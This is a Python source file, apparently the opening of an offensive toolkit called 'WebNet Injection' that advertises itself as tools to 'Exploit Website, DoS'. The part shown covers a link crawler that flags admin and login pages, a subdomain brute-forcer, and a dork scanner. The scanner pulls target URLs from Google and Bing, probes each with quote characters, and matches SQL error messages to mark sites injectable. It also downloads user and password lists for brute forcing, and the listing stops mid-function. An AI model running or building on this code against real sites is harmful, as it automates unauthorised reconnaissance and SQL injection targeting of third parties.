#!/usr/bin/python
import sys, os, re, io

# Color [ANSI] ===============
W = "\033[38;5;245m"
PINK = "\033[38;5;207m"
P = "\033[38;5;105m"
R = '\033[0;31m'
G = '\033[0;32m'
O = '\033[38;5;130m'
B = '\033[38;5;37m'
BR = '\033[1;31m'
BG = '\033[1;32m'
BO = '\033[38;5;208m'
BB = '\033[38;5;51m'

printout = W+"["+BO+"+"+W+"]"
success = W+"["+BG+"+"+W+"]"
fail = W+"["+BR+"-"+W+"]"
error = W+"["+BR+"!"+W+"]"
found = W+"["+BG+"Found!"+W+"]"
loading = W+"["+BO+"%"+W+"]"
systm = W + "[" + BR + "$" + W + "]"
loginfound = W+"["+BG+"Login Page Found!"+W+"]"
notfound = W+"["+BR+"Page Not Found!"+W+"]"
ercon = W + "[" + BR + "ERROR! Could Not Connect" + W + "]"
invalid = W + "   [" + BR + "$" + W + "]" + BR + " Invalid!"

author = "SansXploit "
git = "https://github.com/SansXpl/WebNet"
version = "v1.0"
#str_pswd = "Xpl99"
line1 = "\n\n==============================["
line2 = "]==============================\n\n"

term_size = os.get_terminal_size()
whitespace = ""

for xx in range(term_size.columns):
  whitespace += " "
  
whitespace = whitespace

try:
  import platform
except ImportError as sp:
  os.system("pip install platform")

if sys.version[0] in '2':
   print('\n[x] Not Supported For python 2.x Please Use Python 3.x \n')
   ins = input('Install Python3? Y/n: ')
   if ins == '1' or ins == '01':
     os.system('apt install python3')
   else:
     exit()

print(f"{systm}{BG} Cleaning Temp Folder...\n")
if os.path.exists("./.temp"):
  for i in os.listdir("./.temp"):
    if os.path.exists(os.path.join("./.temp", i)):
      os.remove(os.path.join("./.temp", i))

#Setup =====================================
if not os.path.exists("./output"):
    os.makedirs("./output")

if not os.path.exists("./.temp"):
   os.makedirs("./.temp")

if not os.path.exists("./src"):
    os.makedirs("./src")

if not os.path.exists("./src/adminpages.txt"):
    os.system("wget -O ./src/adminpages.txt https://raw.githubusercontent.com/SansXpl/src/main/adminpages.txt")

if not os.path.exists("./src/subdomains.txt"):
    os.system("wget -O ./src/subdomains.txt https://raw.githubusercontent.com/SansXpl/src/main/subdomains.txt")
    
if not os.path.exists("./src/error_sql.txt"):
    os.system("wget -O ./src/subdomains.txt https://raw.githubusercontent.com/SansXpl/src/main/error_sql.txt")

if not os.path.exists("./src/UserAgent.txt"):
    os.system("wget -O ./src/UserAgent.txt https://raw.githubusercontent.com/SansXpl/src/main/UserAgent.txt")

if not os.path.exists("./src/brute"):
    os.makedirs("./src/brute")

if not os.path.exists("./src/brute/incorrectMessage.txt"):
    os.system("wget -O ./src/brute/incorrectMessage.txt https://raw.githubusercontent.com/SansXpl/src/main/incorrectMessage.txt")

if not os.path.exists("./src/brute/successMessage.txt"):
    os.system("wget -O ./src/brute/successMessage.txt https://raw.githubusercontent.com/SansXpl/src/main/successMessage.txt")

if not os.path.exists("./src/brute/users.txt"):
    os.system("wget -O ./src/brute/users.txt https://raw.githubusercontent.com/SansXpl/src/main/users.txt")

if not os.path.exists("./src/brute/passwords.txt"):
    os.system("wget -O ./src/brute/passwords.txt https://raw.githubusercontent.com/SansXpl/src/main/passwords.txt")

if not os.path.exists("./output/crawler"):
    os.makedirs("./output/crawler")

if not os.path.exists("./output/subscan"):
    os.makedirs("./output/subscan")

if not os.path.exists("./output/dorkscan"):
    os.makedirs("./output/dorkscan")

if not os.path.exists("./output/adminfind"):
    os.makedirs("./output/adminfind")

if not os.path.exists("./output/logbrute"):
    os.makedirs("./output/logbrute")

if not os.path.exists("./output/wpbrute"):
    os.makedirs("./output/wpbrute")

if not os.path.exists("./output/nslookup"):
    os.makedirs("./output/nslookup")

if not os.path.exists("./output/revIP"):
    os.makedirs("./output/revIP")

try:
  print(f"{loading}{BO} Checking Packages ...")
  import mechanicalsoup, blessed, lxml, threading, subprocess, http.client as httplib, urllib.parse, httplib2, socket, os.path, ipaddress, ipdetector, collections, datetime, requests, random, json, time, uuid
  from mechanicalsoup import StatefulBrowser
  from re import findall
  from os import getcwd as pth
  from time import sleep,localtime
  from urllib.parse import urlparse
  from urllib.parse import urljoin
  from lxml import html
  from sys import exit
  from threading import Thread
  from ipdetector import ipCategorizer
  from requests import ConnectionError
  from time import sleep
  from collections import namedtuple
  from datetime import datetime
  from blessed import Terminal
  print(f"\n{success}{BG} Packages is OK")
    
except ImportError as chk:
  print(f"\n{loading}{BO} Checking Packages ... \n")
  try:
    import blessed
    print(f"{success}{BG} blessed Ok")
  except ImportError as a0:
    print(f"{loading}{BO} Installing blessed")
    os.system("pip install blessed")

  try:
    import threading
    print(f"{success}{BG} threading Ok")
  except ImportError as a1:
    print(f"{loading}{BO} Installing threading")
    os.system("pip install threading")

  try:
    import subprocess
    print(f"{success}{BG} subprocess Ok")
  except ImportError as a2:
    print(f"{loading}{BO} Installing subprocess")
    os.system("pip install subprocess")
  
  try:
    import http.client as httplib
    print(f"{success}{BG} http.client Ok")
  except ImportError as a3:
    print(f"{loading}{BO} Installing http.client")
    os.system("pip install http.client")
  
  try:
    import urllib.parse
    print(f"{success}{BG} urllib.parse Ok")
  except ImportError as a4:
    print(f"{loading}{BO} Installing urllib.parse")
    os.system("pip install urllib.parse")
  
  try:
    import httplib2
    print(f"{success}{BG} httplib2 Ok")
  except ImportError as a5:
    print(f"{loading}{BO} Installing httplib2")
    os.system("pip install httplib2")

  try:
    import socket
    print(f"{success}{BG} socket Ok")
  except ImportError as a6:
    print(f"{loading}{BO} Installing socket")
    os.system("pip install socket")
    
  try:
    import os.path
    print(f"{success}{BG} os.path Ok")
  except ImportError as a7:
    print(f"{loading}{BO} Installing os.path")
    os.system("pip install os.path")
    
  try:
    import ipaddress
    print(f"{success}{BG} ipaddress Ok")
  except ImportError as a8:
    print(f"{loading}{BO} Installing ipaddress")
    os.system("pip install ipaddress")
    
  try:
    import ipdetector
    print(f"{success}{BG} ipdetector Ok")
  except ImportError as a9:
    print(f"{loading}{BO} Installing ipdetector")
    os.system("pip install ipdetector")
    
  try:
    import collections
    print(f"{success}{BG} collections Ok")
  except ImportError as a10:
    print(f"{loading}{BO} Installing collections")
    os.system("pip install collections")
    
  try:
    import datetime
    print(f"{success}{BG} datetime Ok")
  except ImportError as a11:
    print(f"{loading}{BO} Installing datetime")
    os.system("pip install datetime")
    
  try:
    import requests
    print(f"{success}{BG} requests Ok")
  except ImportError as a12:
    print(f"{loading}{BO} Installing requests")
    os.system("pip install requests")
    
  try:
    import random
    print(f"{success}{BG} random Ok")
  except ImportError as a13:
    print(f"{loading}{BO} Installing random")
    os.system("pip install random")
    
  try:
    import json
    print(f"{success}{BG} json Ok")
  except ImportError as a14:
    print(f"{loading}{BO} Installing json")
    os.system("pip install json")
    
  try:
    import time
    print(f"{success}{BG} time Ok")
  except ImportError as a15:
    print(f"{loading}{BO} Installing time")
    os.system("pip install time")
  
  try:
    import uuid
    print(f"{success}{BG} uuid Ok")
  except ImportError as a16:
    print(f"{loading}{BO} Installing uuid")
    os.system("pip install uuid")

  try:
    import lxml
    print(f"{success}{BG} lxml Ok")
  except ImportError as a17:
    print(f"{loading}{BO} Installing lxml")
    os.system("pip install lxml")

  try:
    import mechanicalsoup
    print(f"{success}{BG} mechanicalsoup Ok")
  except ImportError as a18:
    print(f"{loading}{BO} Installing mechanicalsoup")
    os.system("pip install mechanicalsoup")
    
  from time import sleep,localtime
  from mechanicalsoup import StatefulBrowser
  from re import findall
  from os import getcwd as pth
  from urllib.parse import urlparse
  from urllib.parse import urljoin
  from lxml import html
  from sys import exit
  from threading import Thread
  from ipdetector import ipCategorizer
  from requests import ConnectionError
  from time import sleep
  from collections import namedtuple
  from datetime import datetime
  from blessed import Terminal

osdevice = {'Win','Win98','WinNT3','WinNT4','Windows','WindowsCE'}

if platform.system() in osdevice:
  clrcmd = '"cls"'
  print(f"\n{systm}{BO} OS is Windows, using CLS to clear Terminal")
else:
  clrcmd = '"clear"'
  print(f"\n{systm}{BO} OS is Linux or Other, using CLEAR to clear Terminal")

time.sleep(0.750)

#Public =====================================
def open_ressources(file_path):
  return [item.replace("\n", "") for item in open(file_path).readlines()]


INCORRECT_MESSAGE = open_ressources('./src/brute/incorrectMessage.txt')
SUCCESS_MESSAGE = open_ressources('./src/brute/successMessage.txt')
PASSWORDS = open_ressources('./src/brute/passwords.txt')
USERS = open_ressources('./src/brute/users.txt')
LIMIT_TRYING_ACCESSING_URL = 7

os.system(clrcmd)
banner = f"""\033[38;5;208m
     │_________________________
 │   │''|''|''|''|''|''|''|''| \__
 ┝━━━┥   \033[1;208;41m[WEBNET INJECTION!]\033[0;38;5;208m    __]━───────────
 │   │_________________________/
     │                      \033[1;31mBy: {author} {version}
     {W}
+──────────────────────────────────────────────+\033[38;5;51m
  Tools For Exploit Website, DoS, Crawler, Etc 
   \033[38;5;208mGithub: {git}{W}
+──────────────────────────────────────────────+"""

def checkConnection(url,option):
  sys.stdout.write(f"\n{loading}{BO} Checking Connecting to {BB}{url}")
  try:
    requests.get(url, timeout=10)
    sys.stdout.write(f"\r{whitespace}")
    sys.stdout.write(f"\r{success}{BG} Connection Established!\n")
  except:
    sys.stdout.write(f"\r{error}{BR} Connection Error, Maybe Your Internet Connection or Website Down!")
    input("")
    if option == 1:
      main()
    elif option == 0:
      pass

def removeDups(inputfile):
    tmp = ".temp/"
    filename = inputfile
    os.rename(tmp + inputfile, tmp + inputfile + "_old")
    lines=open(tmp + inputfile + "_old", 'r').readlines()

    lines_set = set(lines)
    out=open(tmp + filename, 'w')
    for line in lines_set:
        out.write(line)
    os.remove(tmp + inputfile + "_old")

def save_file(name, content, mode):
  if mode == 1:
    if os.path.exists(name):
      os.rename(name, name + "_old")
      liner_stamp = time.time()
      liner_time = datetime.fromtimestamp(liner_stamp)
      liner = liner_time.strftime("%d-%m-%Y | %H:%M:%S")
      line = line1 + liner + line2
      old = open(name + "_old", "r")
      new = open(name, "a+")
      text = content
      new.writelines(line + text + old.read())
      old.close()
      new.close()
      os.remove(name + "_old")
    else:
      liner_stamp = time.time()
      liner_time = datetime.fromtimestamp(liner_stamp)
      liner = liner_time.strftime("%d-%m-%Y | %H:%M:%S")
      line = line1 + liner + line2
      text = content
      new = open(name, "a+")
      new.writelines(line + text)
      new.close()

    input(f"\n{success}{BG} Output Saved In: {P}{name}")

  elif mode == 2:
    if os.path.exists(name):
      os.rename(name, name + "_old")
      liner_stamp = time.time()
      liner_time = datetime.fromtimestamp(liner_stamp)
      liner = liner_time.strftime("%d-%m-%Y | %H:%M:%S")
      line = line1 + liner + line2
      old = open(name + "_old", "r")
      new = open(name, "a+")
      text = content
      new.writelines(line + text + old.read())
      old.close()
      new.close()
      os.remove(name + "_old")
    else:
      liner_stamp = time.time()
      liner_time = datetime.fromtimestamp(liner_stamp)
      liner = liner_time.strftime("%d-%m-%Y | %H:%M:%S")
      line = line1 + liner + line2
      text = content
      new = open(name, "a+")
      new.writelines(line + text)
      new.close()

    print(f"\n{success}{BG} Output Saved In: {P}{name}")

  elif mode == 3:
    if os.path.exists(name):
      os.rename(name, name + "_old")
      liner_stamp = time.time()
      liner_time = datetime.fromtimestamp(liner_stamp)
      liner = liner_time.strftime("%d-%m-%Y | %H:%M:%S")
      line = line1 + liner + line2
      old = open(name + "_old", "r")
      new = open(name, "a+")
      text = content
      new.writelines(line + text + old.read())
      old.close()
      new.close()
      os.remove(name + "_old")
    else:
      liner_stamp = time.time()
      liner_time = datetime.fromtimestamp(liner_stamp)
      liner = liner_time.strftime("%d-%m-%Y | %H:%M:%S")
      line = line1 + liner + line2
      text = content
      new = open(name, "a+")
      new.writelines(line + text)
      new.close()

    input(f"\n{success}{BG} Login Page Saved In: {P}{name}")

  elif mode == 4:
    if os.path.exists(name):
      os.rename(name, name + "_old")
      liner_stamp = time.time()
      liner_time = datetime.fromtimestamp(liner_stamp)
      liner = liner_time.strftime("%d-%m-%Y | %H:%M:%S")
      line = line1 + liner + line2
      old = open(name + "_old", "r")
      new = open(name, "a+")
      text = content
      new.writelines(line + text + old.read())
      old.close()
      new.close()
      os.remove(name + "_old")
    else:
      liner_stamp = time.time()
      liner_time = datetime.fromtimestamp(liner_stamp)
      liner = liner_time.strftime("%d-%m-%Y | %H:%M:%S")
      line = line1 + liner + line2
      text = content
      new = open(name, "a+")
      new.writelines(line + text)
      new.close()

    print(f"\n{success}{BG} Login Page Saved In:{P}{name}")


#Web Crawler =====================================
class crawler:
    def crawl_func(self,mode):
      try:
        os.system(clrcmd)
        print(banner)
        print(f"{W}[{BR}@{W}]{BG} Web Crawler {W}")

        if (mode == 1):
          filetemp = str(uuid.uuid4())
          filetemp2 = str(uuid.uuid4())
          s_url = str(
            input(f" └─[{O}Url [eg:https://www.google.com]:{P}"))
          if "http://" in s_url or "https://" in s_url:
            s_url = s_url
            n_url = urlparse(s_url).hostname
          else:
            n_url = s_url
            s_url = "http://" + s_url
        
          try:
            checkConnection(s_url,1)
          except:
            main()
          print(f"\n{loading}{BO} Crawling Site...")
          try:
            response = requests.get(s_url)
            linkList = re.findall('(?:href=")(.*?)"',
                              response.content.decode('utf8'))
            print(f"\n{success}{BG} Site Crawl Successful !!")

            print(f"\n{loading}{BB} Printing Site...\n")
            continues = 1
          except Exception as e:
            continues = 0
            input(f"{error}{BR} Error Crawling Site Error Code: "+ str(e))

          adm = 0
          if continues == 1:
            for link in linkList:
              link = urljoin(s_url, link)
              if "admin" in link or "login" in link:
                print(f"{loginfound}{BG} {link}")
                text = "\nUrl: {}".format(link)
                temp = open("./.temp/" + filetemp2, "a+")
                temp.writelines(text)
                temp.close()
                time.sleep(0.05)
                adm = 1
              else:
                print(printout + O + " " + link)
                text = "{}\n".format(link)
                temp = open("./.temp/" + filetemp, "a+")
                temp.writelines(text)
                temp.close()
                time.sleep(0.05)

          elif continues == 0:
              main()
            
          if os.path.exists(".temp/" + filetemp):
            removeDups(filetemp)
            c = open("./.temp/" + filetemp, "r")
            name = "./output/crawler/" + n_url + ".txt"
            content = c.read()
            c.close()
            os.remove(".temp/" + filetemp)
            save_file(name, content, 1)
          else:
            input(f"\n{fail}{BO} Nothing is Saved!")
          

          if (adm == 1):
            if os.path.exists(".temp/" + filetemp):
              removeDups(filetemp)
              c = open("./.temp/" + filetemp, "r")
              name = "./output/adminfind/" + n_url + ".txt"
              content = c.read()
              c.close()
              os.remove(".temp/" + filetemp)
              save_file(name, content, 3)
            else:
              input(f"\n{fail}{BO} Nothing is Saved!")
          main()

        elif (mode == 2):
          filetemp = str(uuid.uuid4())
          filetemp2 = str(uuid.uuid4())
          path = str(input(f" └─[{O}Path [eg:output/lists.txt]:{P} "))
          if not os.path.exists(path):
            input(f"{error}{BR} File Does Not Exists!")
            self.crawl_func(mode)
          with open(path, 'r') as f:
            crwlists = f.read().splitlines()
          print("\n")
          for crwlist in crwlists:

            s_url = crwlist
            if "http://" in s_url or "https://" in s_url:
              s_url = s_url
              n_url = urlparse(s_url).hostname
            else:
              n_url = s_url
              s_url = "http://" + s_url

            try:
              checkConnection(s_url,0)
            except:
              main()
            print(f"\n{loading}{BO} Crawling Site...")
            try:
              response = requests.get(s_url)
              linkList = re.findall('(?:href=")(.*?)"',
                                response.content.decode('utf8'))
              print(f"\n{success}{BG} Site Crawl Successful !!")

              print(f"\n{success}{BB} Printing Site...\n")
              continues = 1
            except Exception as e:
              continues = 0
              input(f"{error}{BR} Error Crawling Site Error Code: "+ str(e))

            adm = 0
            if continues == 1:
              for link in linkList:
                link = urljoin(s_url, link)
                if "admin" in link or "login" in link:
                  print(f"{loginfound}{BG} {link}")
                  text = "\nUrl: {}".format(link)
                  temp = open("./.temp/" + filetemp2, "a+")
                  temp.writelines(text)
                  temp.close()
                  time.sleep(0.05)
                  adm = 1
                else:
                  print(printout + O + " " + link)
                  text = "{}\n".format(link)
                  temp = open("./.temp/" + filetemp, "a+")
                  temp.writelines(text)
                  temp.close()
                  time.sleep(0.05)

            elif continues == 0:
              pass

            if os.path.exists(".temp/" + filetemp):
              removeDups(filetemp)
              c = open("./.temp/" + filetemp, "r")
              name = "./output/crawler/" + n_url + ".txt"
              content = c.read()
              c.close()
              os.remove(".temp/" + filetemp)
              save_file(name, content, 2)
            else:
              print(f"\n{fail}{BO} Nothing is Saved!")

            if (adm == 1):
              if os.path.exists(".temp/" + filetemp):
                removeDups(filetemp)
                c = open("./.temp/" + filetemp, "r")
                name = "./output/adminfind/" + n_url + ".txt"
                content = c.read()
                c.close()
                os.remove(".temp/" + filetemp)
                save_file(name, content, 4)
              else:
                print(f"\n{fail}{BO} Nothing is Saved!")
            time.sleep(2)
          main()
      except KeyboardInterrupt:
        cancel()


#Subdomain Scanner =====================================
class SUB:

  def request(url):
    try:
      return requests.get("http://" + url)
    except requests.exceptions.ConnectionError:
      pass

  def sub_func(self,mode):
    try:
      os.system(clrcmd)
      print(banner)
      print(f"{W}[{BR}@{W}]{BG} Subdomain Scanner {W}")

      if (mode == 1):
        filetemp = str(uuid.uuid4())
        s_url = str(
          input(f" └─[{O} Url [eg:https://www.google.com]:{P} "))
        if "http://" in s_url or "https://" in s_url:
          n_url = urlparse(s_url).hostname
          s_url = n_url
        else:
          n_url = s_url
          s_url = s_url
        
        checkConnection(s_url,1)

        try:
          subdomains = []
          with open("./src/subdomains.txt", 'r') as file:
            try:
              for line in file:
                word = line.strip()
                test_url = word + "." + s_url
                response = self.request(test_url)
                subdomains.append("https://" + test_url)
                test_url = 'https://' + test_url

                sys.stdout.write("\r" + whitespace)
                sys.stdout.write(f"\r{loading}{BO} CHECKING: {test_url}")
                time.sleep(0.02)

                if response:
                  sys.stdout.write("\r" + whitespace)
                  sys.stdout.write(f"\r{success}{BG} FOUND: {test_url}\n")
                  text = "Url: {}\n".format(test_url)
                  temp = open("./.temp/" + filetemp, "a+")
                  temp.writelines(text)
                  temp.close()

            except KeyboardInterrupt:
              if os.path.exists(".temp/" + filetemp):
                removeDups(filetemp)
                c = open("./.temp/" + filetemp, "r")
                name = "./output/subscan/" + n_url + ".txt"
                content = c.read()
                c.close()
                os.remove(".temp/" + filetemp)
                save_file(name, content, 1)
              else:
                input(f"\n{fail}{BO} Nothing is Saved!")
                main()
              main()

            if os.path.exists(".temp/" + filetemp):
              removeDups(filetemp)
              c = open("./.temp/" + filetemp, "r")
              name = "./output/subscan/" + n_url + ".txt"
              content = c.read()
              c.close()
              os.remove(".temp/" + filetemp)
              save_file(name, content, 2)
            else:
              input(f"\n{fail}{BO} Nothing is Saved!")
              main()
          main()
        except requests.exceptions.ConnectionError:
          print("\n"+ ercon + R +
                " " + test_url)
    except KeyboardInterrupt:
      cancel()

#Dork Scanner =====================================

def useragentdork():
        listAgent= open("./src/UserAgent.txt", "r")
        Agent = listAgent.read().splitlines()
        uag = random.choice(Agent)
        return uag

class scrape(StatefulBrowser):

      def __repr__(
        fitur = {
            'features':'html.parser',
        },
        uag = useragentdork()
      ):
          return StatefulBrowser(
            soup_config = fitur,
            user_agent = uag
          )

class Parser(object):
      __list = []
      def __init__(
        self,
        dork,
        URL,
        pattern,
        class_tag,
        proxy = None
      ):
          self.dork = dork
          self.URL = URL
          self.__pattern = pattern
          self.class_tag = class_tag
          self.proxy = {
            'https':proxy
          }
          
      def __dir__(self):
          return list(set(self.__list))
          
      def get_page(self):
          self.__req = scrape()
          s = self.__req.open(
            self.URL,
            proxies = self.proxy,
            timeout = 10
          )
          self.__req.select_form(
            'form[action="/search"]'
          )
          self.__req['q'] = self.dork
          self.__req.submit_selected()
          _content = str(self.__req.get_current_page())
          for urls in findall(
            self.__pattern,
            _content                        
          ):  
              if 'www.google.com' in self.URL: self.__list.append(urls)
              else: self.__list.append(urls[:-1])
          return self.__req.get_current_page().find_all(
            'a',
            class_=self.class_tag
          )
          
      def request(self):
          self.__req = scrape()
          for page in self.get_page():
              try:
                  self.__req.open(
                    f'{self.URL}{page.get("href")}',
                    proxies = self.proxy
                  )
                  content = str(self.__req.get_current_page())
                  for urls in findall(
                  self.__pattern,
                  content
                  ):
                      if 'www.google.com' in self.URL: self.__list.append(urls)
                      else: self.__list.append(urls[:-1])
              except Exception as e:
                  input(BR+str(e))
                  main()


urls = []

class crawl(object):

      auth = {
        1:[
            'https://www.google.com',
            'class="r"><a href="/url\?q=(.*?)&amp',
            'fl'
        ],
        2:[
            'https://www.bing.com',
            'h=".*?" href="(h.*?")',
            "b_widePag sb_bp"
        ]
      }
      
      def __init__(
        self,
        dork,
        proxy = None                
      ):  
          self.dork = dork
          self.proxy = proxy

      def Bing(self):
          bing = Parser(
            self.dork,
            crawl.auth[2][0],
            crawl.auth[2][1],
            crawl.auth[2][2],
            proxy = self.proxy
          )
          bing.request()
          for url in dir(bing):
              if 'go.microsoft.com' in url or 'bing.com' in url:
                  pass
              else:
                  urls.append(url)
              
      def Google(self):
          google = Parser(
            self.dork,
            crawl.auth[1][0],
            crawl.auth[1][1],
            crawl.auth[1][2],
            proxy = self.proxy
          )
          google.request()
          for url in dir(google):
              if 'go.microsoft.com' in url or 'bing.com' in url:
                 pass
              else:
                 urls.append(url)


class dorkscan():
  def main(self):
    try:
      filetemp = str(uuid.uuid4())
      vulntemp = str(uuid.uuid4())+"_vuln"
      os.system(clrcmd)
      print(banner)
      print(f"{W}[{BR}@{W}]{BG} Dork Scanner{W}")
      dorks = str(input(f"{W} ├─[{O}Dork [eg:inurl:view.php?id= | Add -s = Scan Dork eg:dork -s]:{P} "))
      proxy = str(input(f"{W} └─[{O}Proxy [eg:127.0.0.1:1337 | Leave Blank = No Use Proxy]:{P} "))
      
      prx = BR+"Not Set"
      if "-s" in dorks or "--scan" in dorks:
        _scan = "y"
        sqli = BG+"Scanned"
        if "--scan" in dorks:
          _dork = dorks.replace("--scan", "" )
        else:
          _dork = dorks.replace("-s", "" )

      else:
        _scan = "n"
        sqli = BR+"Not Scanned"
        _dork = dorks
    
      if proxy.isspace() or "" in proxy:
        proxy = None
        prx = BR+"Not Set"
      else:
        prx = BB+str(proxy)
      
      if not _dork.isspace() or "" in _dork:
        pass
      else:
        input(f"{error}{BR} Input Dork!") 
        self.main()

      print(f"\n{printout}{BO} Dork..: {BB}{_dork}")
      print(f"{printout}{BO} SQLi..: {sqli}")
      print(f"{printout}{BO} Proxy.: {prx}")

      checkConnection('http://www.google.com',1)
      sys.stdout.write(f"\n{loading}{BO} Try Getting Url...")
      
      nm= re.sub("[*:/<>?|=.]","_",_dork)
      mn = nm.replace("\ ", "")
      if _scan == "y":
          if _dork != None:
            _ = crawl(_dork,proxy=proxy)
            _.Bing()
            _.Google()
            sys.stdout.write(f"\r{success}{BG} Getting Url Success!")
            if urls != []:
                #for url in list(set(urls)):
                #   print('- {}'.format(url))
                for scan in list(set(urls)):
                      try:
                          try:
                              dq = 0
                              _vuln = 0
                              __vuln = ""
                              with open("./src/error_sql.txt", 'r') as f:
                                sqlerror = f.read().splitlines()

                              sys.stdout.write(f"\n{loading}{BO} Checking Vuln ['][-]: {W}{scan}")
                              resp = requests.get(scan+"'")
                              errcount = 1
                              for err in sqlerror:
                                sys.stdout.write(f"\r{whitespace}")
                                sys.stdout.write(f"\r{loading}{BO} Checking Vuln ['][{int(errcount)}]: {W}{scan}")
                                errcount += 1
                                if re.search(err,resp.text):
                                  temp = open("./.temp/" + vulntemp, "a+")
                                  text = f"""[Checking With Single Quote (’)]
Url: {scan}
Error: {err}\n\n"""
                                  temp.writelines(text)
                                  temp.close()

                                  __vuln = err

                                  sys.stdout.write("\r"+whitespace)
                                  sys.stdout.write(f'\n{success}{BG} Vulnerability SQLi!')
                                  print(f'\n{error}{BR} Error Text: {W}{__vuln}')
                                  print(f'{printout}{BB} Url: {P}{scan}\n')
                                  break
                                  pass
                                else:
                                  dq = 1
                                  pass
                                time.sleep(0.02)


                              if dq == 1:
                                sys.stdout.write(f"\r{whitespace}")
                                sys.stdout.write(f'\r{loading}{BO} Checking Vuln ["][-]: {W}{scan}')
                                resp1 = requests.get(scan+'"')
                                errcount = 1
                                for err in sqlerror:
                                  sys.stdout.write(f"\r{whitespace}")
                                  sys.stdout.write(f'\r{loading}{BO} Checking Vuln ["][{int(errcount)}]: {W}{scan}')
                                  errcount += 1
                                  if re.search(err,resp1.text):
                                    temp = open("./.temp/" + vulntemp, "a+")
                                    text = f"""[Checking With Double Quote (”)]
Url: {scan}
Error: {err}\n\n"""
                                    temp.writelines(text)
                                    temp.close()

                                    __vuln = err

                                    sys.stdout.write("\r"+whitespace)
                                    sys.stdout.write(f'\n{success}{BG} Vulnerability SQLi!')
                                    print(f'\n{error}{BR} Error Text: {W}{__vuln}')
                                    print(f'{printout}{BB} Url: {P}{scan}\n')
                                    break
                                  else:
                                    sys.stdout.write("\r"+whitespace)
                                    sys.stdout.write(f"\r{error}{BR} Not Vulnerability: {W}{scan}")
                                    #print(f'{BB}[URL]{W} : {self.url}')
                                    text = "{}\n".format(scan)
                                    temp = open("./.temp/" + filetemp, "a+")
                                    temp.writelines(text)
                                    temp.close()
                                    pass
                                  time.sleep(0.02)

                          except Exception as e:
                            print(BR+e)

                          except KeyboardInterrupt:
                            pause = str(input(f"\n{systm}{BB} [S = Skip] [X = Stop] {BO}Default is Skip [S/X?]"))

                            if pause == "X" or pause == "x":
                              if os.path.exists(".temp/" + vulntemp):
                                c = open("./.temp/" + vulntemp, "r")
                                name = "./output/vulnsqli/" + nm + "vuln.txt"
                                content = c.read()
                                c.close()
                                os.remove(".temp/" + vulntemp)
                                save_file(name, content, 2)

                                if os.path.exists(".temp/" + filetemp):
                                  sv = input(f"\n{error}{BO} Save Output? {BR}[Not Vuln]{P} y/N?: ")
                                  if sv.isspace() or "" in sv:
                                    sv = "n"
                                  if sv == "y" or sv == "Y":
                                      if os.path.exists(".temp/" + filetemp):
                                          removeDups(filetemp)
                                          c = open("./.temp/" + filetemp, "r")
                                          name = "./output/dorkscan/" + nm + ".txt"
                                          content = c.read()
                                          c.close()
                                          os.remove(".temp/" + filetemp)
                                          save_file(name, content, 1)
                                      else:
                                          input(f"\n{fail}{BO} Nothing is Saved!")

                                  else:
                                      os.remove(".temp/" + filetemp)
                                      input(f"\n{fail}{BO} Nothing is Saved!")
                                else:
                                  input("")
                                main()

                              else:
                                if os.path.exists(".temp/" + filetemp):
                                  sv = input(f"\n{error}{BO} Save Output? {BR}[Not Vuln]{P} y/N?: ")
                                  if sv.isspace() or "" in sv:
                                    sv = "n"
                                  if sv == "y" or sv == "Y":
                                      if os.path.exists(".temp/" + filetemp):
                                          removeDups(filetemp)
                                          c = open("./.temp/" + filetemp, "r")
                                          name = "./output/dorkscan/" + nm + ".txt"
                                          content = c.read()
                                          c.close()
                                          os.remove(".temp/" + filetemp)
                                          save_file(name, content, 1)
                                      else:
                                          input(f"\n{fail}{BO} Nothing is Saved!")

                                  else:
                                      os.remove(".temp/" + filetemp)
                                      input(f"\n{fail}{BO} Nothing is Saved!")
                                else:
                                  input(f"\n{fail}{BO} Nothing is Saved!")
                              main()
                              break

                            else:
                              pass

                      except Exception:
                        sys.stdout.write("\r"+whitespace)
                        sys.stdout.write(f"\r{error}{BR} Not Vulnerability: {W}{scan}")
                        #print(f'{BB}[URL]{W} : {self.url}')
                        text = "{}\n".format(scan)
                        temp = open("./.temp/" + filetemp, "a+")
                        temp.writelines(text)
                        temp.close()
                        pass

                if os.path.exists(".temp/" + vulntemp):
                  c = open("./.temp/" + vulntemp, "r")
                  name = "./output/vulnsqli/" + nm + "vuln.txt"
                  content = c.read()
                  c.close()
                  os.remove(".temp/" + vulntemp)
                  save_file(name, content, 2)
                  if os.path.exists(".temp/" + filetemp):
                    sv = input(f"\n{error}{BO} Save Output? {BR}[Not Vuln]{P} y/N?: ")
                    if sv.isspace() or "" in sv:
                      sv = "n"
                    if sv == "y" or sv == "Y":
                        if os.path.exists(".temp/" + filetemp):
                            removeDups(filetemp)
                            c = open("./.temp/" + filetemp, "r")
                            name = "./output/dorkscan/" + nm + ".txt"
                            content = c.read()
                            c.close()
                            os.remove(".temp/" + filetemp)
                            save_file(name, content, 1)
                        else:
                            input(f"\n{fail}{BO} Nothing is Saved!")

                    else:
                        os.remove(".temp/" + filetemp)
                        input(f"\n{fail}{BO} Nothing is Saved!")
                  else:
                    input("")

                else:
                  if os.path.exists(".temp/" + filetemp):
                    sv = input(f"\n{error}{BO} Save Output? {BR}[Not Vuln]{P} y/N?: ")
                    if sv.isspace() or "" in sv:
                      sv = "n"
                    if sv == "y" or sv == "Y":
                        if os.path.exists(".temp/" + filetemp):
                            removeDups(filetemp)
                            c = open("./.temp/" + filetemp, "r")
                            name = "./output/dorkscan/" + nm + ".txt"
                            content = c.read()
                            c.close()
                            os.remove(".temp/" + filetemp)
                            save_file(name, content, 1)
                        else:
                            input(f"\n{fail}{BO} Nothing is Saved!")

                    else:
                        os.remove(".temp/" + filetemp)
                        input(f"\n{fail}{BO} Nothing is Saved!")
                  else:
                    input("")
                main()          
            else:
              input(f'\n{fail}{BR} No Url Found, Nothing is Saved!')
              main()
          else:
             input(invalid)   

      elif _scan == "n":
          if _dork != None:
            _ = crawl(_dork,proxy=proxy)
            _.Bing()
            _.Google()
            sys.stdout.write(f"\r{success}{BG} Getting Url Success!")
            if urls != []:
                for url in list(set(urls)):
                  try:
                    print(printout+BO+' {}'.format(url))

                    text = "{}\n".format(url)
                    temp = open("./.temp/" + filetemp, "a+")
                    temp.writelines(text)
                    temp.close()

                  except KeyboardInterrupt:
                    if os.path.exists(".temp/" + filetemp):
                      removeDups(filetemp)
                      c = open("./.temp/" + filetemp, "r")
                      name = "./output/dorkscan/" + nm + ".txt"
                      content = c.read()
                      c.close()
                      os.remove(".temp/" + filetemp)
                      save_file(name, content, 1)
                    else:
                      input(f"\n{fail}{BO} Nothing is Saved!")

                if os.path.exists(".temp/" + filetemp):
